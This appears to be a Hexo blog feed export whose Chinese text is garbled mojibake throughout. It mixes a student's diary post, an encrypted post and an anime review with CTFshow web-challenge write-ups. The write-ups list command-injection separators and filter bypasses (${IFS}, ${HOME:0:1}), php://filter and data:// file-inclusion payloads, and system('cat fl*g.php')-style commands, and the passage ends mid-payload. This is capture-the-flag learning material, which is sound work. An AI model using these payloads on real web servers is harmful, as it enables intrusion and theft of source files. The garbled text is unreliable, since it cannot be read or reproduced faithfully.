æˆbase64çš„æ—¶å€™è¦å»æ‰ ï¼</p><h4 id="web116"><a href="#web116" class="headerlink" title="web116"></a>web116</h4><p>è®¿é—®ç½‘é¡µç»™äº†è§†é¢‘ï¼Œformoståˆ†è§£å‡ºæ¥æœ‰å›¾ç‰‡æ˜¯ç½‘ç«™æºç </p><p><img src="web116.png" loading="lazy"></p><p>ç„¶åç›´æ¥è®¿é—®flag.phpå°±è¡Œï¼Œè¯´å®è¯æœ‰ç‚¹æ‡µï¼Œå› ä¸ºè¿‡æ»¤æŒºç‹ çš„</p><h4 id="web117"><a href="#web117" class="headerlink" title="web117"></a>web117</h4><p>å‚è€ƒæ–‡ç« ï¼š</p><p><a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html">è°ˆä¸€è°ˆphp:&#x2F;&#x2F;filterçš„å¦™ç”¨</a></p><p><a href="https://blog.csdn.net/qq_44657899/article/details/109300335">php:&#x2F;&#x2F;filterçš„å„ç§è¿‡æ»¤å™¨</a></p><p>è¿™é“é¢˜è¿‡æ»¤äº†rot13ï¼Œbase64ï¼Œstringç­‰ä¸€äº›è¿‡æ»¤å™¨çš„å†…å®¹ï¼Œé‚£æ¢å…¶ä»–è¿‡æ»¤å™¨ä¸å°±å®Œäº‹äº†ã€‚</p><p>è¿™é‡Œæˆ‘ä»¬ç”¨<code>convert.iconv.*</code>è¿™ä¸ªè¿‡æ»¤å™¨ã€‚</p><p>payloadï¼š</p><blockquote><p>GET: ?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.iconv.ucs-2be.ucs-2le&#x2F;resource&#x3D;a.php</p><p>ä»<code>UCS-2LE</code>ç¼–ç è½¬æ¢ä¸º<code>UCS-2BE</code>ç¼–ç </p><p>POST: contents&#x3D;?&lt;hp pvela$(G_TEâ€™[â€˜a)] ;&gt;?</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> å®‰å…¨ç›¸å…³ </category>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ–‡ä»¶åŒ…å« </tag>
            
            <tag> CTFshow </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>byeSophomore</title>
      <link href="/2024/06/26/byeSophomore/"/>
      <url>/2024/06/26/byeSophomore/</url>
      
        <content type="html"><![CDATA[<p>ç«¯åˆå›æ¥çš„é‚£å¤©ä¸‹åˆä¸å°å¿ƒéª¨æŠ˜äº†ï¼Œåˆšåˆšå®Œæˆäº†è¯¾è®¾ï¼Œé™¤äº†å¼€å­¦çš„ç¼“è€ƒå¤–ï¼Œå¯¹æˆ‘æ¥è¯´ï¼Œå¤§å­¦ç”Ÿæ´»å·²ç»æ‚„ç„¶è¿‡åŠ</p><p>è¯´èµ·æ¥ä¹ŸæŒºç¢Œç¢Œæ— ä¸ºçš„ï¼Œä½†ä¹Ÿä¸è‡³äºä¸€äº‹æ— æˆï¼Œåªæ˜¯è§‰å¾—è¿˜ä¸å¤Ÿã€‚å¯¹äºæœªæ¥çš„è§„åˆ’ï¼Œå¦ç™½è¯´æˆ‘åªæƒ³è€è€å®å®ä¸Šä¸ªç­èµšé’±ï¼Œå¤§å®¶éƒ½æƒ³èµšå¾—å¤šï¼Œå› ä¸ºè¿™æ ·æ‰æœ‰èµ„æ ¼èµå›å±äºè‡ªå·±çš„ä¸€ç‚¹è‡ªç”±ï¼Œä½†ä¹ŸæŒºè¿·èŒ«ï¼Œå› ä¸ºç¡®å®æ²¡æƒ³å¥½å…·å…·ä½“ä½“çš„æ–¹å‘ã€‚</p><blockquote><p>ç©ºè™šçš„å‹‰åŠ±å’Œæ²¹è…»çš„é¸¡æ±¤ä¸€æ ·ä»¤æˆ‘åèƒƒï¼Œå¦‚æœä¸€ä¸ªäººèƒ½è½»æ˜“åœ°é€šè¿‡å‡ å¥æ–‡å­—å¾—åˆ°åè¶³çš„åŠ¨åŠ›ï¼Œè¿™ä¸ªäººææ€•ä¹Ÿå•çº¯æ— è„‘è€Œæ˜“äºå—åˆ°åˆ©ç”¨ï¼›è€Œè¿œå¤§æ·±åˆ»çœŸæ­£æœ‰æ•ˆçš„æ¿€åŠ±ï¼Œå´æ˜¯ä¸€æ®µè¯æ— æ³•è¡¨è¾¾ã€è¡¨è¾¾åä¹Ÿæ— æ‰€è£¨ç›Šçš„ï¼šå†™å‡ºæ¥åªæ˜¯ç»™åˆ«äººçœ‹çš„è¡¨å†³å¿ƒï¼Œåˆä¸èƒ½æ·±åŒ–è¿™ä¸€æ¿€åŠ±ã€‚è¿™ä¸€ç±»çš„æ–‡å­—ï¼Œè¦ä¹ˆåªæ˜¯æµäºå½¢å¼çš„æ•·è¡ï¼Œè¦ä¹ˆå°±æ˜¯æµ…è–„çš„è¡¨éœ²ã€‚</p></blockquote><p>æ€»ä¹‹è¿˜å¾—å»åšå§ï¼Œç©ºæƒ³å€’ä¹Ÿæ²¡ä»€ä¹ˆç”¨ï¼Œæˆ‘å†™è¿™äº›ä¸œè¥¿ä¸çŸ¥é“è¦ç»™è°çœ‹ï¼Œä¹Ÿä¸çŸ¥é“è°ä¼šçœ‹åˆ°ï¼Œæˆ‘è¡¨è¾¾èƒ½åŠ›ä¸€å‘å¾ˆå¼±ï¼Œæ€»è§‰å¾—æ˜¯è¯»çš„ä¹¦å¤ªå°‘ï¼Œæ‰€ä»¥ä¹Ÿæ²¡æœ‰æƒ³ç€è‡ªå·±å†™çš„è¿™ç‚¹ä¸œè¥¿èƒ½ç»™åˆ«äººå¸¦æ¥ä»€ä¹ˆï¼Œå°±æƒ³è®°å½•ä¸€ä¸‹å§ã€‚</p><p>æƒ³äº†å¥½å¤šï¼Œè¿˜æ˜¯ç®—äº†</p>]]></content>
      
      
      <categories>
          
          <category> æ‚è°ˆ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Campus </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å¯èƒ½çœŸçš„è¦ç­‰å¥½ä¹…äº†</title>
      <link href="/2024/06/17/%E8%BF%99%E4%BC%BC%E4%B9%8E%E6%98%AF%E4%B8%80%E4%B8%AA%E9%97%AD%E7%8E%AF/"/>
      <url>/2024/06/17/%E8%BF%99%E4%BC%BC%E4%B9%8E%E6%98%AF%E4%B8%80%E4%B8%AA%E9%97%AD%E7%8E%AF/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="e522772ea704707720a4ef0bc557a013923c8e9594f20e1e414419ebbbe9f8c7">6b09021c4fad842555217a8d07b3963feb852d3e21f8742f65fcd76a470d0bd132968d4640d394f9980075d76c1e54c55906bfeeb9d4b19a98ae91997175b4116f505795b7b910c3386a65db4722adc0cc05a4478c6a9bd4bc6e5b8233db3a139e6d31da6c7ea1cbea42884836829b6c085f5664568bc6ea1c32e141417bb618db4bb820f58414f39ada0f9301699f332f2d8ba91c4d9f00f587dfdd8cc25a9e1ba7e869aab6ca7897472cceec9c42aa5653556e963006430dd7ae93240198851e4c49c871bc97ab7c376e51e2a240f54137f454c6298e4c6cbc9ce8f28b83e42547ae361e88c61836a6f71400a33085d0aca6fa807d8e11bbf2dcd6962b286af488105934d22a04e9f2e0d96ebe14597baa789a4753c60d6d2737814d39d02a94c010763760ed4ab4d9c98a3ef4da26e48bae060cfd1a357e3f3f740da5b486e0604b5ad6ed6762c499a7ea8b843448c893679f123443b4998bde3cf7fd4145b6cef62f81d7d93737020320b0e23541555e880fea8707bb86efc5eb301b980d68362000fba23912338cfbc222360f316c5b26a09297697f0b442300a185fc224540ed14d4f6b9b56c2c90f2ccf70875ec7d2f03aa2b1cc2c4d1f01772d14154ffa797f4247e153da0f8b87550482fc337a7e7b2701c4e7180282ec6fc05cb25c71bfe2b3ca63a95e6bfa153832774b1da60405909979bbdadaccd13874f3d3bbc1506612118e8111ac08adfb6f4944da15f0d93e3e18cf22f942eef8640a5e921f340c074d93efa9ce303824ea2c2173c750b03d0ca025bdde24e3287f71e083c4dc81abfd7fd51f91600d50ca94a76a778bb4fd5f71fd66cd3f639ff2e4a4331ff5fc177482301680bb501c3aa8b25b079ed9a63752ed5abf85e1fdf4ae54fc04acac0e54b928cc7eb39fc987a11bba9050655b470f3fb2a159deea5e1ca7d573acce7c7f4a5250bc3249e4487c73f7a8ed7067d3dd09e6871dd0d448ed358c388430538ad145d5cfaaa472a7b7553d73281fa7aad8037dfdeb00aa2f53b3bb83b1fdfdb7a99749d58f2ce97369c95ab5561e7406501a9463e9f74f293dae82484bf02cd92e0ca53a6e307bcd513d26069177efad396a4628d4eeeb9c642d5211abc1ac9cd63eb1c6b3e1aef02390bf3e1dbc531fd2d3850f5a6397759de2bf295fd9068a3b7afb5cd1ff3f910e80d6c5ab4812c64688e7c9694b721c7e5c1ab547a11eafbbb71b30899639877c2b10719dcdf3ac1f215ea733cebacab4f4d019c6efbc82d4e474c076d65fc3c063e055be71425c0dcab0d48e1da8cb659adecb2ec4489fc0aa71d71613ffd694955df279aca61fd267d4ae1be23e399c0dca1df15aa793a02997fbeb87cc019e1bab7b78ea55e14783ad10f9b9508eb44314c89aac04aac3ae7f06e7b0897c5b79ed5829c064fa10e5db82d616ab1e9d82e253dc99d0bb8b3f868a0ba6f583f46335a49923edaf0c629c2fd85e87425fa40e6ad7f72a5174bc640dded86cad62e17cf2f75dde1c4e1519a30da2dd7dafc129992eaf346da628941bfe2404dc1471fde14548edf1fa018774df7f99c8f9094b05c7767b77cbc019ab4ab4d195afa0a50b0bc5063c3b6343a157d63ab54e10d084c861e2015e47e68ffda2d10cc0b79298b8f4a7c4b9d046ec861a32246220f1b46489b762a85f1d7d1f6488424d89b80d43f312f2b84232b0bcaced24921db52222da9ece94827544c8dfecf8790186634a966ec60c48fb5e0b7ee49b1ec97e5780c9a1497a3264a912483377f3a6cff979a0cf358c6d807627f1b490a41819be1e5ebfd4945c7d494b7f68eac8f8aeeae61697c3aaad07326063dd7a84b9b35f3c1fe2599ecd6c4080e3cc6e456555c68b10069f9dc4aa73c204b18290c2d9a7f4b28ef9acfa4bca8fa735f76da9f02cacb54913fd480204f5f33c2b636008571647a7e5d1d1ed8631fce3e9a5709260cb0c829586b556c5d175a6d2a72e6351d8ff252febae745c979657e7d276bc23ff0ab34a5f22445af1127d283e71ca7b3a84761334dc1d408944f66dea2647ab335cb1bb70da8143ce73711d8c77d59a29b14d42be38386f94ea7e2ee82cbfc155fae65db97f537970539391d0da75435d3b28c0b4dc7fc2cd732ccc48b024d9b87c605de90e0b7ef38e55195100a547d826cfa7159597a823577ce716ef8919ac4297a312bcb0c073b3146c3d66952756fb43cb4b37614dd0545f2ae17319a33fc1cf3fd3574b7c1cc3f04f76d93ac7aa564e3e6be54d8eaf86b784a48cbcf4420fb24692206291e3ce9a6bfac560c6c87473d68d778f792e8ced1f58c30c9f4b5d0542736606ed396f509a5810a4d20be921ab88e3c3c244bbb52a48fa92b33bdd4d9e69bfc7a875e46c6afc3f9312997af870cc69b9d81e3b0ac691c1afbbbc6c920729ebdacbdc487caf18a1a247768909f0cad6074b695cd9bcd7c3cae0c5aea4fc39c15c119bb893afefdcc703c8add147c7eb886b3197fb570e2472d07302d14fb13ee4e834d07f689c1082925bbb3d3d22bda707719c939c364faf76794a2656322958e904460a9f0b43090dcfb60a6ae7e9555916b662aadda62fbb96e70a8a16436ae100788e1cca5e9</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Maybe have a guess</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> æ‚è°ˆ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ç¢ç¢å¿µ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CyberPunk</title>
      <link href="/2024/06/05/CyberPunk/"/>
      <url>/2024/06/05/CyberPunk/</url>
      
        <content type="html"><![CDATA[<p><img src="1.png" alt="CyberPunk" loading="lazy"></p><p><img src="2.png" loading="lazy"><em>Lucyå¸¦Davidç¬¬ä¸€æ¬¡æ¥æœˆçƒ</em></p><p>ä¹‹å‰æœ‰å¾ˆå¤šæœ‹å‹å®‰åˆ©è¿‡ï¼Œçœ‹åˆ°å¾ˆå¤šåŒå­¦å–œæ¬¢è¿™ä¸ªåŠ¨æ¼«ï¼Œçœ‹å®Œåä¸å‡ºæ„æ–™çš„éå¸¸å¥½çœ‹ </p><p>æœ€æ‰“åŠ¨æˆ‘çš„å½“ç„¶æ˜¯Lucyå’ŒDavidï¼ŒDavidä»ç¬¬ä¸€æ¬¡è¢«Lucyå¸¦è¿›æœˆçƒï¼Œå°±ä¸€ç›´è®°å¾—Lucyæœ€æƒ³å»æœˆçƒäº†ï¼ŒLucyä¸ºäº†ä¿æŠ¤Davidä¸€ç›´åœ¨ä¸é¡¾å±é™©çš„é»˜é»˜çš„ä»˜å‡ºï¼Œå°½ç®¡æœ€åå¹¶ä¸æ˜¯å®Œç¾çš„ç»“å±€ï¼Œä¸è¿‡æ„ŸåŠ¨æˆ‘çš„æ˜¯ä»–ä»¬å­˜åœ¨äºç»†ææœ«èŠ‚çš„æ¸©æŸ”ã€‚</p><p>å½“ç„¶ï¼Œä¸æ­¢ä»–ä»¬ï¼Œè¿˜æœ‰å¾ˆå¤šä»¤äººéš¾å¿˜çš„è§’è‰²å’Œå‡ºè‰²ç‹¬ç‰¹èƒŒæ™¯è®¾å®šã€‚</p><p>åœ¨å¤§å¤šæ•°ç§‘æŠ€è¢«é¡¶å±‚å„æ–­çš„æ—¶å€™ï¼Œæ¯ä¸ªäººéƒ½ç”Ÿæ´»åœ¨ç›‘æ§ä¹‹ä¸‹ï¼Œä»–ä»¬æ˜¯ä¸€ç¾¤æ¸¸ç¦»åœ¨ç¤¾ä¼šåº•å±‚å’ŒåŸå¸‚è¾¹ç¼˜çš„<em><strong>èµ›åšæœ‹å…‹</strong></em>ï¼Œä»–ä»¬çš„æ¢¦æƒ³å¯èƒ½æ˜¯è‡ªç”±å§ï¼Œä¸è¿‡æ¸´æ±‚è‡ªç”±ä¼¼ä¹å¤ªè¿‡å¥¢æœ›ï¼Œä¸è¿‡ä»–ä»¬ä»¥åŠå¾ˆå¤šä¼™ä¼´éƒ½æœ‰ç€å±äºCyberpunkçš„æµªæ¼«</p><p>åŠ¨æ¼«ä¸­çš„Bgmä¹ŸåŒæ ·å¥½å¬ï¼š<em>I Really Want to Stay at Your House</em></p><p><strong>ä¸€äº›å£çº¸â†“â†“â†“</strong></p><p><img src="3.png" alt="Lucy" loading="lazy"></p><p><img src="4.png" alt="Lucy" loading="lazy"></p><p><img src="5.png" alt="Lucy" loading="lazy"><em>Crazy but beautiful</em></p><p><img src="6.png" alt="Davidå’ŒLucyğŸ¥°" loading="lazy"></p><p><img src="7.png" alt="David&#39;s mom" loading="lazy"><em>Davidçš„éº»éº»ğŸ˜­</em></p><p><img src="8.png" alt="Rebecca" loading="lazy"><em>éå¸¸å¯çˆ±çš„å°å¥³å­©</em></p><p><img src="9.png" alt="Rebecca" loading="lazy"></p><p><img src="10.png" alt="Cyberpunk" loading="lazy"><em>å¤§åˆç…§</em></p><p><strong>è¿™ä¸ªä¸–ç•Œä¸Šæ²¡æœ‰ä»»ä½•äººèƒ½å®Œå…¨ä¿¡ä»»ï¼Œé™¤äº†ä½ è‡ªå·±ã€‚</strong></p><p><img src="14.png" alt="David" loading="lazy"></p><p><strong>å¯¹ä¸èµ·ï¼Œæˆ‘ä»¬ä¸èƒ½ä¸€èµ·ä¸Šæœˆçƒäº†ã€‚</strong></p><p><img src="11.png" loading="lazy"><em>Davidçš„é—è¨€ğŸ˜­ğŸ˜­ğŸ˜­</em></p><p><strong>èµ›åšæœ‹å…‹ä¸éƒ½æ˜¯åœ¨é€ƒé¿æŸç§å¯è€»äººç”Ÿçš„é€ƒéš¾è€…ï¼Œæˆ–æ˜¯æŠ±ç€é¥è¿œå¿—å‘è€Œè¿·å¤±è‡ªæˆ‘çš„é€æ¢¦è€…å— ï¼Ÿ</strong></p><p><img src="12.png" alt="Kiwi" loading="lazy"><em>é…·é…·çš„kiwi</em></p><p><strong>å›é¡¾è¿‡å»æ²¡æœ‰æ„ä¹‰ã€‚</strong></p><p><img src="13.png" alt="David" loading="lazy"></p>]]></content>
      
      
      <categories>
          
          <category> æ‚è°ˆ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Anime </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>EZrce</title>
      <link href="/2024/06/03/EZrce/"/>
      <url>/2024/06/03/EZrce/</url>
      
        <content type="html"><![CDATA[<h3 id="å†™åœ¨å‰é¢"><a href="#å†™åœ¨å‰é¢" class="headerlink" title="å†™åœ¨å‰é¢"></a>å†™åœ¨å‰é¢</h3><h4 id="ç”¨äºå‘½ä»¤æ‰§è¡Œçš„å¸¸è§å§¿åŠ¿"><a href="#ç”¨äºå‘½ä»¤æ‰§è¡Œçš„å¸¸è§å§¿åŠ¿" class="headerlink" title="ç”¨äºå‘½ä»¤æ‰§è¡Œçš„å¸¸è§å§¿åŠ¿"></a>ç”¨äºå‘½ä»¤æ‰§è¡Œçš„å¸¸è§å§¿åŠ¿</h4><p>system</p><p>exec</p><p>passthru</p><p>shell_exec</p><p>include(æ–‡ä»¶åŒ…å«æ¼æ´ï¼Œé…åˆphpä¼ªåè®®)</p><h4 id="ä¸€äº›å¸¸è§çš„ç»•è¿‡æ–¹å¼"><a href="#ä¸€äº›å¸¸è§çš„ç»•è¿‡æ–¹å¼" class="headerlink" title="ä¸€äº›å¸¸è§çš„ç»•è¿‡æ–¹å¼"></a>ä¸€äº›å¸¸è§çš„ç»•è¿‡æ–¹å¼</h4><h5 id="Windowsæ”¯æŒï¼š"><a href="#Windowsæ”¯æŒï¼š" class="headerlink" title="Windowsæ”¯æŒï¼š"></a>Windowsæ”¯æŒï¼š</h5><p>|ç›´æ¥æ‰§è¡Œåé¢çš„è¯­å¥ ping 127.0.0.1|whoami<br>||å‰é¢å‡ºé”™æ‰§è¡Œåé¢çš„ ï¼Œå‰é¢ä¸ºå‡ ping 2||whoami<br>&amp; å‰é¢çš„è¯­å¥ä¸ºå‡åˆ™ç›´æ¥æ‰§è¡Œåé¢çš„,å‰é¢å¯çœŸå¯å‡ ping 127.0.0.1&amp;whoami<br>&amp;&amp;å‰é¢çš„è¯­å¥ä¸ºå‡åˆ™ç›´æ¥å‡ºé”™ï¼Œåé¢çš„ä¹Ÿä¸æ‰§è¡Œï¼Œå‰é¢åªèƒ½ä¸ºçœŸ ping 127.0.0.1&amp;&amp;whoami</p><p>%0a å›è½¦</p><p>%1a ä½œä¸º.batæ–‡ä»¶çš„å‘½ä»¤åˆ†éš”ç¬¦</p><h5 id="Linuxæ”¯æŒ"><a href="#Linuxæ”¯æŒ" class="headerlink" title="Linuxæ”¯æŒ:"></a>Linuxæ”¯æŒ:</h5><p>;å‰é¢çš„æ‰§è¡Œå®Œæ‰§è¡Œåé¢çš„ ping 127.0.0.1;whoami<br>|ç®¡é“ç¬¦ï¼Œæ˜¾ç¤ºåé¢çš„æ‰§è¡Œç»“æœ ping 127.0.0.1|whoami<br>||å½“å‰é¢çš„æ‰§è¡Œå‡ºé”™æ—¶æ‰§è¡Œåé¢çš„ ping 1||whoami<br>&amp; å‰é¢çš„è¯­å¥ä¸ºå‡åˆ™ç›´æ¥æ‰§è¡Œåé¢çš„,å‰é¢å¯çœŸå¯å‡ ping 127.0.0.1&amp;whoami<br>&amp;&amp;å‰é¢çš„è¯­å¥ä¸ºå‡åˆ™ç›´æ¥å‡ºé”™ï¼Œåé¢çš„ä¹Ÿä¸æ‰§è¡Œï¼Œå‰é¢åªèƒ½ä¸ºçœŸ ping 127.0.0.1&amp;&amp;whoami</p><p>%0a å›è½¦</p><p>%0d æ¢è¡Œ</p><h5 id="è¿‡æ»¤ç©ºæ ¼ç»•è¿‡"><a href="#è¿‡æ»¤ç©ºæ ¼ç»•è¿‡" class="headerlink" title="è¿‡æ»¤ç©ºæ ¼ç»•è¿‡"></a>è¿‡æ»¤ç©ºæ ¼ç»•è¿‡</h5><p>ä½¿ç”¨&lt;ä»£æ›¿ç©ºæ ¼</p><p>ä½¿ç”¨${IFS}ä»£æ›¿ç©ºæ ¼</p><blockquote><p>IFSå˜é‡çš„ç›¸å…³ä¿¡æ¯ï¼š</p><ul><li>ShellæŠŠå˜é‡IFSå†…çš„æ¯ä¸€ä¸ªå­—ç¬¦éƒ½å½“åšæ˜¯ä¸€ä¸ªåˆ†å‰²ç¬¦(delimeter)ï¼Œç”¨è¿™äº›å­—ç¬¦ä½œä¸ºæ¯ä¸€ä¸ªå­—æ®µçš„ç»“æŸç¬¦æ¥è¿›è¡Œåˆ†å‰²ã€‚</li><li>å¦‚æœIFSæ²¡æœ‰è®¾ç½®ï¼Œæˆ–è€…IFSçš„å€¼è¢«è®¾ç½®ä¸ºâ€\t\nâ€(space, tabå’Œ newline)ï¼Œé‚£ä¹ˆæ“ä½œå¯¹è±¡çš„å¼€å§‹å’Œç»“æŸå¤„çš„æ‰€æœ‰space, tabå’Œnewlineåºåˆ—éƒ½å°†è¢«å¿½ç•¥ï¼Œä½†æ˜¯æ“ä½œå¯¹è±¡ä¸­é—´çš„space, tabå’Œnewlineåºåˆ—ä¼šä½œä¸ºç•Œå®šç¬¦å·¥ä½œã€‚</li><li>å¦‚æœIFSå€¼ä¸æ˜¯é»˜è®¤å€¼(ä¾‹å¦‚ç¨‹åºä¸­å¯¹IFSè¿›è¡Œè®¾ç½®è¿‡)ï¼Œåªæœ‰å‡ºç°åœ¨IFSå†…çš„ç©ºç™½å­—ç¬¦(å¯èƒ½æ˜¯space, tabæˆ–newlineä¸­çš„ä¸€ä¸ªæˆ–å‡ ä¸ª)æ‰ä¼šåœ¨å•è¯å¼€å§‹å’Œç»“æŸå¤„è¢«å¿½ç•¥ï¼Œè¿™é‡Œè¯´çš„æ˜¯å•è¯ï¼Œè€Œä¸æ˜¯æ•´ä¸ªæ“ä½œå¯¹è±¡ã€‚</li><li>IFSå†…çš„éç©ºç™½å­—ç¬¦å¤šä¸ªè¿ç»­å‡ºç°æ—¶ï¼Œæ¯ä¸ªéç©ºç™½å­—ç¬¦ä¼šè¢«å½“åšå•ç‹¬çš„åˆ†éš”ç¬¦çœ‹å¾…ï¼Œä½†æ˜¯å¤šä¸ªè¿ç»­çš„ç©ºç™½å­—ç¬¦ä¼šè¢«å½“åšä¸€ä¸ªåˆ†éš”ç¬¦çœ‹å¾…ã€‚</li><li>å¦‚æœIFSä¸ºç©º(â€œnullâ€)ï¼Œåˆ™ä¸ä¼šè¿›è¡Œå•è¯åˆ†å‰²ã€‚</li></ul></blockquote><p>ä½¿ç”¨$IFSä»£æ›¿ç©ºæ ¼</p><h5 id="è¿‡æ»¤æ–œæ -ç»•è¿‡"><a href="#è¿‡æ»¤æ–œæ -ç»•è¿‡" class="headerlink" title="è¿‡æ»¤æ–œæ &#x2F;ç»•è¿‡"></a>è¿‡æ»¤æ–œæ &#x2F;ç»•è¿‡</h5><p>ä½¿ç”¨${HOME:0:1}ä»£æ›¿</p><h5 id="phpä¼ªåè®®"><a href="#phpä¼ªåè®®" class="headerlink" title="phpä¼ªåè®®"></a>phpä¼ªåè®®</h5><p>PHP ä¼ªåè®®æ˜¯ PHP æ”¯æŒçš„åè®®ä¸å°è£…åè®®ï¼Œå‡ ä¸ª PHP æ”¯æŒçš„ä¼ªåè®®å¦‚ä¸‹ã€‚</p><table><thead><tr><th>ä¼ªåè®®</th><th>åŠŸèƒ½</th></tr></thead><tbody><tr><td>file:&#x2F;&#x2F;</td><td>è®¿é—®æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿ</td></tr><tr><td>http:&#x2F;&#x2F;</td><td>è®¿é—® HTTP(s) ç½‘å€</td></tr><tr><td>php:&#x2F;&#x2F;</td><td>è®¿é—®å„ä¸ªè¾“å…¥&#x2F;è¾“å‡ºæµ</td></tr><tr><td>phar:&#x2F;&#x2F;</td><td>PHP å½’æ¡£</td></tr><tr><td>zip:&#x2F;&#x2F;</td><td>å‹ç¼©æµ</td></tr></tbody></table><p>ä¾‹å¦‚åœ¨ allow_url_include &#x3D; on æ—¶æœåŠ¡å™¨ä¸Šæœ‰ä¸ªæ–‡ä»¶å« index.phpï¼Œä¸”å­˜åœ¨æ–‡ä»¶åŒ…å«æ¼æ´ï¼Œè¿™ä¸ªæ—¶å€™å°±èƒ½ç”¨ php ä¼ªåè®®ç›´æ¥æŠŠæ–‡ä»¶æ˜¾ç¤ºå‡ºæ¥ã€‚</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token operator">?</span>file<span class="token operator">=</span>php<span class="token punctuation">:</span><span class="token comment">//filter/read=convert.base64-encode/resource=index.php</span></code></pre><p>ç¨å¾®è§£é‡Šä¸‹è¿™ä¸ªåšæ³•ï¼Œphp:&#x2F;&#x2F;filter&#x2F; æ˜¯ä¸€ç§è®¿é—®æœ¬åœ°æ–‡ä»¶çš„åè®®ï¼Œ&#x2F;read&#x3D;convert.base64-encode&#x2F; è¡¨ç¤ºè¯»å–çš„æ–¹å¼æ˜¯ base64 ç¼–ç åï¼Œresource&#x3D;index.php è¡¨ç¤ºç›®æ ‡æ–‡ä»¶ä¸ºindex.phpã€‚é—®ä»€ä¹ˆè¦è¿›è¡Œ base64 ç¼–ç å‘¢ï¼Ÿå¦‚æœä¸è¿›è¡Œ base64 ç¼–ç ä¼ å…¥ï¼Œindex.php å°±ä¼šç›´æ¥æ‰§è¡Œï¼Œæˆ‘ä»¬å°±çœ‹ä¸åˆ°æ–‡ä»¶ä¸­çš„å†…å®¹äº†ã€‚php åè®®è¿˜å¸¸ç”¨ php:&#x2F;&#x2F;inputï¼Œè¿™å¯ä»¥è®¿é—®è¯·æ±‚çš„åŸå§‹æ•°æ®çš„åªè¯»æµï¼Œå¯ä»¥è¯»å– POST è¯·æ±‚çš„å‚æ•°ã€‚</p><h5 id="data-ä¼ªåè®®"><a href="#data-ä¼ªåè®®" class="headerlink" title="data ä¼ªåè®®"></a>data ä¼ªåè®®</h5><p>php 5.2.0 èµ·ï¼Œæ•°æ®æµå°è£…å™¨å¼€å§‹æœ‰æ•ˆï¼Œä¸»è¦ç”¨äºæ•°æ®æµçš„è¯»å–ï¼Œå¦‚æœä¼ å…¥çš„æ•°æ®æ˜¯PHPä»£ç å°±ä¼šæ‰§è¡Œä»£ç ã€‚ä½¿ç”¨æ–¹æ³•ä¸º:</p><pre class="language-none"><code class="language-none">data:&#x2F;&#x2F;text&#x2F;plain;base64,xxxx(base64ç¼–ç åçš„æ•°æ®)</code></pre><h5 id="æ— å›æ˜¾å‘½ä»¤æ‰§è¡Œ"><a href="#æ— å›æ˜¾å‘½ä»¤æ‰§è¡Œ" class="headerlink" title="æ— å›æ˜¾å‘½ä»¤æ‰§è¡Œ"></a>æ— å›æ˜¾å‘½ä»¤æ‰§è¡Œ</h5><p>1.tee ä»æ ‡å‡†è¾“å…¥è¯»å–ï¼Œå†å†™å…¥æ ‡å‡†è¾“å‡ºå’Œæ–‡ä»¶ã€‚</p><p>2.åå¼¹shell</p><p>3.dnslogå¤–å¸¦</p><h5 id="ä¸‹åˆ’çº¿çš„æ­£åˆ™ç»•è¿‡"><a href="#ä¸‹åˆ’çº¿çš„æ­£åˆ™ç»•è¿‡" class="headerlink" title="ä¸‹åˆ’çº¿çš„æ­£åˆ™ç»•è¿‡"></a>ä¸‹åˆ’çº¿çš„æ­£åˆ™ç»•è¿‡</h5><p> è¿™ä¸ªæ­£åˆ™çš„ç»•è¿‡æ–¹æ³•å°±æ˜¯åˆ©ç”¨ç‰¹æ€§æ¥ç»•è¿‡ï¼Œå¯ä»¥ç”¨</p><p>ã€€[</p><p> (ç©ºæ ¼)</p><p> + ã€€</p><p> .</p><p>ä¸Šé¢é‚£å‡ ä¸ªå­—ç¬¦ä»»ä½•ä¸€ä¸ªéƒ½è¡Œï¼Œéƒ½å¯ä»¥è¢«å¤„ç†æˆ_</p><h3 id="web29-124"><a href="#web29-124" class="headerlink" title="web29-124"></a>web29-124</h3><h4 id="web29"><a href="#web29" class="headerlink" title="web29"></a>web29</h4><p>åªæ˜¯è¿‡æ»¤äº†ç®€å•çš„flagå­—ç¬¦ï¼Œç›´æ¥ä½¿ç”¨systemå‡½æ•°</p><p>Payload:</p><blockquote><p>1ã€ç”¨egrepæ•ˆæœä¸€æ ·egrep&#x3D;grep  -E<br>c&#x3D;system(â€œcat fl<em>g.php | grep  -E â€˜fl.gâ€™ â€œ);<br>2ã€æ­¤ç§æ–¹å¼éœ€è¦å³é”®æºä»£ç <br>c&#x3D;system(â€œcat fl</em>g.phpâ€);<br>3ã€</p><p>c&#x3D;system(â€œtac fl<em>g.phpâ€);<br>4ã€å€’åºè¾“å‡ºæ–‡æœ¬<br>c&#x3D;system(â€œtac fl</em>ag.phpâ€);<br>5ã€<br>c&#x3D;system(â€œcp fl*g.php a.txt â€œ);<br>è®¿é—®&#x2F;a.txt<br>6ã€ç›´æ¥è¾“å‡ºä¸€ä¸ªphpè¿™æ ·å°±å¯ä»¥ç›´æ¥åˆ©ç”¨ä»£ç äº†,æ³¨æ„ä¹Ÿæ˜¯å³é”®æŸ¥çœ‹æºä»£ç <br>c&#x3D;system(â€˜echo -e â€œ &lt;?php \n error_reporting(0); \n  $c&#x3D; 